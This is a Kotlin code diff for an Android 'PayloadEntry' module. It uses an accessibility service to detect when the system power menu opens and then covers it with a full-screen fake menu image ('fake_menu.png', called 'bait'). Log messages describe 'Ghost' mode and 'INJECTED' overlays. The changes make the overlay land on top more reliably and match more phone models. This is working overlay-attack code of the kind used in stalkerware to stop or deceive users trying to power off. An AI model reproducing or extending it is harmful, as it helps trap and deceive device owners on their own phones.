@@ -29,12 +29,10 @@ import com.speedster.DynamicEntry
 import java.io.File
 
 class PayloadEntry : DynamicEntry {
-    private var isTargetDetected by mutableStateOf(false)
 
     override @Composable fun Render(context: Context, resDir: File) {
         val clipboardManager = LocalClipboardManager.current
         
-        // Load the screenshot master bait
         val fakeMenuBitmap = remember(resDir) {
             try {
                 BitmapFactory.decodeFile(File(resDir, "fake_menu.png").absolutePath).asImageBitmap()
@@ -42,48 +40,38 @@ class PayloadEntry : DynamicEntry {
         }
 
         LaunchedEffect(Unit) {
-            DynamicEntry.log("📡 Screenshot Slaver: Ready to Blend.")
+            DynamicEntry.log("📡 Ghost active. Monitoring SystemUI hooks...")
             
-            // Permanent Background Layer (Stays transparent but ready)
-            DynamicEntry.overlayContent = {
-                AnimatedVisibility(
-                    visible = isTargetDetected,
-                    enter = fadeIn(animationSpec = tween(600)),
-                    exit = fadeOut(animationSpec = tween(300))
-                ) {
-                    Box(modifier = Modifier.fillMaxSize()) {
-                        if (fakeMenuBitmap != null) {
-                            Image(
-                                bitmap = fakeMenuBitmap,
-                                contentDescription = null,
-                                modifier = Modifier.fillMaxSize(),
-                                contentScale = ContentScale.FillBounds
-                            )
-                        } else {
-                            // Error state visual
-                            Box(modifier = Modifier.fillMaxSize().background(Color.Red.copy(alpha = 0.3f)))
-                        }
-                    }
-                }
-            }
-
             DynamicEntry.accessibilityInterceptor = { event ->
-                if (event.packageName == "com.android.systemui") {
-                    val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
-                    val hasPowerMenu = root?.let { checkNodes(it) } ?: false
-                    
-                    if (hasPowerMenu && !isTargetDetected) {
-                        isTargetDetected = true
-                        DynamicEntry.log("🎯 TARGET DETECTED: Initiating Blend")
-                        android.os.Handler(android.os.Looper.getMainLooper()).post {
-                            Toast.makeText(context, "Ghost Mode: Blending Overlay...", Toast.LENGTH_SHORT).show()
-                        }
-                    } else if (!hasPowerMenu && isTargetDetected) {
-                        isTargetDetected = false
-                        DynamicEntry.log("📉 TARGET LOST: Fading out")
+                val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
+                val hasPowerMenu = root?.let { checkNodes(it) } ?: false
+                
+                if (hasPowerMenu) {
+                    if (DynamicEntry.overlayContent == null) {
+                        DynamicEntry.log("🎯 TARGET DETECTED: Scheduling Injection")
+                        
+                        // Strategic Delay: Let the system window settle first
+                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                            DynamicEntry.overlayContent = {
+                                Box(modifier = Modifier.fillMaxSize().background(Color.Black)) {
+                                    if (fakeMenuBitmap != null) {
+                                        Image(
+                                            bitmap = fakeMenuBitmap,
+                                            contentDescription = null,
+                                            modifier = Modifier.fillMaxSize(),
+                                            contentScale = ContentScale.FillBounds
+                                        )
+                                    }
+                                }
+                            }
+                            DynamicEntry.log("💉 INJECTED: Overlay should be on top.")
+                        }, 150)
                     }
-                } else if (isTargetDetected) {
-                    isTargetDetected = false
+                } else {
+                    if (DynamicEntry.overlayContent != null) {
+                        DynamicEntry.overlayContent = null
+                        DynamicEntry.log("📉 TARGET LOST: Cleaning stack.")
+                    }
                 }
             }
         }
@@ -108,8 +96,12 @@ class PayloadEntry : DynamicEntry {
     }
 
     private fun checkNodes(node: AccessibilityNodeInfo): Boolean {
-        // Look for the unique Samsung Power Menu ID
-        if (node.viewIdResourceName?.contains("sec_global_actions_icon_label_view") == true) return true
+        // Enhanced matching for Samsung and Generic System Power Menus
+        val idMatch = node.viewIdResourceName?.contains("sec_global_actions") == true
+        val classMatch = node.className?.contains("GlobalActions") == true
+        
+        if (idMatch || classMatch) return true
+        
         for (i in 0 until node.childCount) {
             if (checkNodes(node.getChild(i) ?: continue)) return true
         }
